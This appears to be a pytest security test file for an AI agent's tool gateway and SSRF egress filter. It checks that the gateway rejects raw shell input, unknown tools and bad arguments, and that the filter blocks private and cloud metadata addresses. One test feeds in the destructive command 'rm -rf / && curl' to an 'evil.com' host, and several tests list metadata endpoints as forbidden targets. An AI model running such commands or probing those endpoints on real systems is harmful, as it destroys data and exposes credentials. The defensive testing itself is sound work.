import pytest
from fastapi import HTTPException
from app.agents.terminal_head.tool_gateway import tool_gateway, DNSLookupArgs
from app.agents.browser_head.ssrf_filter import SSRFEgressFilter, SecurityPolicyViolation


@pytest.mark.asyncio
async def test_ac_sec_01_arbitrary_shell_rejected():
    """AC-SEC-01: Arbitrary shell command is strictly rejected by ToolGateway."""
    with pytest.raises(HTTPException) as exc_info:
        await tool_gateway.execute_tool(
            tool_id="dns_lookup",
            arguments={"target": "example.com"},
            raw_shell_command="rm -rf / && curl http://evil.com"
        )
    assert exc_info.value.status_code == 400
    assert "arbitrary shell execution is forbidden" in exc_info.value.detail.lower()


def test_ac_sec_02_ssrf_egress_blocks_forbidden_destinations():
    """AC-SEC-02: SSRFEgressFilter blocks loopback, private IP, link-local, and cloud metadata."""
    forbidden_targets = [
        "http://127.0.0.1:8000/internal",
        "http://localhost:5432",
        "http://10.0.0.1/admin",
        "http://172.16.0.5/api",
        "http://192.168.1.1/router",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.123/v1",
        "http://metadata.google.internal/computeMetadata/v1",
    ]

    for target in forbidden_targets:
        with pytest.raises((SecurityPolicyViolation, HTTPException)):
            SSRFEgressFilter.validate_url(target)


def test_ac_sec_02_ssrf_egress_permits_public_destinations():
    """AC-SEC-02: Public routable destinations pass validation."""
    public_targets = [
        "https://example.com",
        "https://www.google.com",
    ]
    for target in public_targets:
        hostname, resolved_ips = SSRFEgressFilter.validate_url(target)
        assert hostname is not None
        assert len(resolved_ips) > 0


@pytest.mark.asyncio
async def test_ac_sec_04_schema_validation_and_adapter_safety():
    """AC-SEC-04: Tool arguments must strictly match Pydantic schema."""
    # Attempting to execute unknown tool
    with pytest.raises(HTTPException) as exc1:
        await tool_gateway.execute_tool(
            tool_id="unregistered_dangerous_tool",
            arguments={"cmd": "whoami"}
        )
    assert exc1.value.status_code == 404

    # Invalid arguments for dns_lookup
    with pytest.raises(HTTPException) as exc2:
        await tool_gateway.execute_tool(
            tool_id="dns_lookup",
            arguments={"target": "x", "record_type": "DANGEROUS_TYPE"}  # fails min_length & pattern
        )
    assert exc2.value.status_code == 400
